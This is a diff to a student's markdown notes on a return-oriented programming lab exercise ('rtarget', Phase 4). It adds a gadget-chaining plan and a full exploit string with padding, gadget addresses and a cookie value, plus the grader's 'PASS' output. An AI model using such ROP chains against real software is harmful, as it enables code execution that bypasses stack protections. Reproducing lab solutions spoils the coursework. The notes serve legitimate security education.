@@ -16,8 +16,11 @@
         - [2.3.1. Attempt Thoughts](#231-attempt-thoughts)
         - [2.3.2. Process Record](#232-process-record)
 - [3. Part II : Return-oriented Programming(ROP) Attacks](#3-part-ii--return-oriented-programmingrop-attacks)
-    - [Level 2](#level-2)
-        - [Gadget Note](#gadget-note)
+    - [3.1. Level 2](#31-level-2)
+        - [3.1.1. Gadget Note](#311-gadget-note)
+        - [3.1.2. Attempt Thoughts](#312-attempt-thoughts)
+        - [3.1.3. Process Record](#313-process-record)
+    - [3.2.](#32)
 
 ---
 
@@ -341,13 +344,13 @@ ROP is not similar to CI to insert our own code
 but try to make fully use of the existing code  
 witch can avoid the protection listed above  
 
-### Level 2
+### 3.1. Level 2
 
 Phase 4  
 target: the same with phase 2  
 bug using gadgets from gadget farm  
 
-#### Gadget Note
+#### 3.1.1. Gadget Note
 
 1. `movq` instructions  
     start witch 2 bytes: `48 89`  
@@ -381,3 +384,62 @@ bug using gadgets from gadget farm
 6. `nop`: `90`  
     it is just used to increment the PC  
     without any side effect  
+
+#### 3.1.2. Attempt Thoughts
+
+have overall understanding of what we want to do  
+
+1. set `%rdi`  
+2. get to `touch2`  
+
+then start to find what gadget we can use  
+
+we find to gadget1:  
+
+1. `popq %rax`  
+2. `movl %eax, %edi`  
+
+and then we can start to exit the exploit string  
+
+it will be filled with several part:  
+
+1. stuff used to fill the buffer  
+2. addr of the gargets  
+3. data to be used  
+
+#### 3.1.3. Process Record
+
+1. find the address of `touch2`  
+
+2. find the address of gadgets  
+
+    we can use partial search tool  
+    to find the gadgets we need  
+
+3. edit the exploit string  
+
+    ```txt
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68 /* 0x28 filling values */ 
+    47 19 40 00 00 00 00 00 /* ret to gadget1 0x0000000000401947 */ 
+    ad e7 df 72 68 68 68 68 /* the value to be popped to %rax 0x0000000072dfe7ad */ 
+    40 19 40 00 00 00 00 00 /* ret to gadget2 0x0000000000401940 */ 
+    7c 17 40 00 00 00 00 00 /* ret to touch2 0x000000000040177c */ 
+    ```
+
+4. employ the exploit string  
+
+5. record  
+
+    ```txt
+    Cookie: 0x72dfe7ad
+    Type string:Touch2!: You called touch2(0x72dfe7ad)
+    Valid solution for level 2 with target rtarget
+    PASS: Sent exploit string to server to be validated.
+    NICE JOB!
+    ```
+
+### 3.2. 
